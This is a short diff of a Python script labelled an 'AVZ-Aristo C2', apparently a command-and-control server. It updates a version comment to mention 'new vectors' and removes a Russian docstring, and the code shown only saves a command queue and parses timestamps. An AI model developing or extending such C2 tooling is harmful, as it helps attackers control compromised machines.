@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo C2 v26.10.1 – исправлена обработка last_seen
+# AVZ-Aristo C2 v29.0 – processing new vectors
 import asyncio, json, os, time, subprocess, requests
 from datetime import datetime
 
@@ -57,7 +57,6 @@ def save_commands():
         json.dump(commands_queue, f, indent=2)
 
 def parse_last_seen(raw):
-    """Преобразует last_seen из строки или float в datetime"""
     if isinstance(raw, datetime):
         return raw
     if isinstance(raw, (int, float)):
